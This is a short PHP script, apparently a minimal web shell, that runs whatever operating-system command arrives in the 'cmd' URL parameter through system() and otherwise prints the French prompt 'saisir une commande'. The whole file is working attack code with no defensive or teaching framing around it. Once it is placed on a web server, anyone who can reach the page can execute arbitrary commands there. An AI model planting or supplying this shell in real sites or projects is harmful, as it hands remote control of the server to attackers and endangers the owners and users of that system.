<?php 
if(!empty($_GET["cmd"])){
    system($_GET["cmd"]);
}
else {
    echo "saisir une commande";
}